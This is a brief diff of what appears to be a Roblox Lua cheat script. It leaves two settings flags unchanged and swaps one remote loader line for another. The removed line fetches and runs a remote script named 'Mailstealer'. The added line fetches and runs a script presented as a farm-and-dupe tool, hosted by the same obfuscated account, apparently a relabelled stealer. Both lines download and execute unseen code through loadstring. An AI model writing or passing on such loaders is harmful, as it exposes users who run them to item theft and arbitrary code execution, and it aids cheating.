@@ -12,4 +12,4 @@ _G.AntiLeave = true --// False is to leave when pets enter
 _G.MouseLock = true --// True To Enable Mouse
 
 --{{ Script }}--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIllll/Mailstealer/main/New%20Mailstealer"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IlllIlIIIlllIlIlllIIlIlllIlIIllll/Cyanide-Mystic-Farm/main/And%20Dupe"))()
